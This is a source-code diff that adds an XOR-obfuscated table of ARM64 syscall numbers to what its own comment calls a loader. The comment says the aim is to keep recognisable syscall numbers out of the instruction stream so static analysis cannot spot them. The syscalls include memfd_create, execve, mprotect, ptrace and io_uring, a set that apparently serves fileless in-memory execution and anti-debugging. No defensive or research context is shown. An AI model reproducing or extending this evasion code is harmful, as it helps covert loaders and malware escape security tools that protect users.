@@ -6,6 +6,40 @@
 #include <openssl/rand.h>
 #include <openssl/err.h>
 
+/*
+ * Obfuscated ARM64 syscall number table.
+ *
+ * Each entry is the actual asm-generic/unistd.h __NR_* value XOR'd with
+ * SC_XOR_KEY. The __NR_* macros in common.h load from this table at
+ * runtime and XOR with the key to recover the real number, so the
+ * literal numbers (63, 64, 222, 279, 425...) never appear as immediates
+ * in the loader's instruction stream.
+ *
+ * `volatile` defeats compiler / LTO constant-folding back to the
+ * literals. `const` keeps the table in .rodata.
+ */
+const volatile uint32_t hARMless_sc[SC_TABLE_LEN] = {
+    [SC_IDX_READ]              =  63u ^ SC_XOR_KEY,
+    [SC_IDX_WRITE]             =  64u ^ SC_XOR_KEY,
+    [SC_IDX_OPEN]              =  56u ^ SC_XOR_KEY,
+    [SC_IDX_CLOSE]             =  57u ^ SC_XOR_KEY,
+    [SC_IDX_MMAP]              = 222u ^ SC_XOR_KEY,
+    [SC_IDX_MUNMAP]            = 215u ^ SC_XOR_KEY,
+    [SC_IDX_EXECVE]            = 221u ^ SC_XOR_KEY,
+    [SC_IDX_MEMFD_CREATE]      = 279u ^ SC_XOR_KEY,
+    [SC_IDX_FTRUNCATE]         =  46u ^ SC_XOR_KEY,
+    [SC_IDX_LSEEK]             =  62u ^ SC_XOR_KEY,
+    [SC_IDX_MPROTECT]          = 226u ^ SC_XOR_KEY,
+    [SC_IDX_PTRACE]            = 101u ^ SC_XOR_KEY,
+    [SC_IDX_GETPID]            = 172u ^ SC_XOR_KEY,
+    [SC_IDX_GETPPID]           = 173u ^ SC_XOR_KEY,
+    [SC_IDX_PRCTL]             = 167u ^ SC_XOR_KEY,
+    [SC_IDX_MSYNC]             = 227u ^ SC_XOR_KEY,
+    [SC_IDX_IO_URING_SETUP]    = 425u ^ SC_XOR_KEY,
+    [SC_IDX_IO_URING_ENTER]    = 426u ^ SC_XOR_KEY,
+    [SC_IDX_IO_URING_REGISTER] = 427u ^ SC_XOR_KEY,
+};
+
 static const uint32_t crc32_table[256] = {
     0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F,
     0xE963A535, 0x9E6495A3, 0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988,
